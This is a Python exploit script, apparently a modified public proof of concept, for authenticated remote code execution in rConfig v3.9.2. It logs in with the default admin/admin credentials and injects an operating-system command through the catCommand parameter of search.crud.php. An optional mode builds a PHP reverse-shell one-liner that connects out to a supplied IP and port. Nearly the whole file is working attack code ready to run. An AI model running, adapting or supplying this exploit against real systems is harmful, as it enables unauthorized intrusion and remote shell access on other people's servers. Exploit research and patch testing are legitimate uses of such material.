#!/usr/bin/python3

# Exploit Title: rConfig v3.9.2 Authenticated Remote Code Execution
# Date: 18/09/2019
# Exploit Author: Askar (@mohammadaskar2)
# Vendor Homepage: https://rconfig.com/
# Software link: https://rconfig.com/download
# Version: v3.9.2
# Tested on: CentOS 7.7 / PHP 7.2.22

# This is a modified version of the original exploit by Askar (@mohammadaskar2)

import requests
import sys
from urllib.parse import quote
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) not in (3, 4, 5):
    print("[+] Usage : ./exploit.py host port [cmd]")
    exit()

target = 'http://{}:{}/'.format(sys.argv[1], sys.argv[2])

if len(sys.argv) == 3:
    cmd = 'sleep 1'
elif len(sys.argv) == 5:
    reverse_ip = sys.argv[3]
    reverse_port = sys.argv[4]

    cmd = """php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");'""".format(reverse_ip, reverse_port)
else:
    cmd = sys.argv[3]

payload = '''""&&{} #'''.format(cmd)

s = requests.session()

login_info = {
    "user": 'admin',
    "pass": 'admin',
    "sublogin": 1
}

login_request = s.post(
    target+"/lib/crud/userprocess.php",
     login_info,
     verify=False,
     allow_redirects=True
 )

dashboard_request = s.get(target+"/dashboard.php", allow_redirects=False)

if dashboard_request.status_code == 200:
    print("[+] LoggedIn successfully")
    encoded_request = target+"/lib/crud/search.crud.php?searchTerm=anything&catCommand={0}".format(quote(payload))

    print("[+] Triggering the payload")
    exploit_req = s.get(encoded_request)

elif dashboard_request.status_code == 302:
    print("[-] Wrong credentials !")
    exit()

else:
    print("[-] Unexpected error occurred")
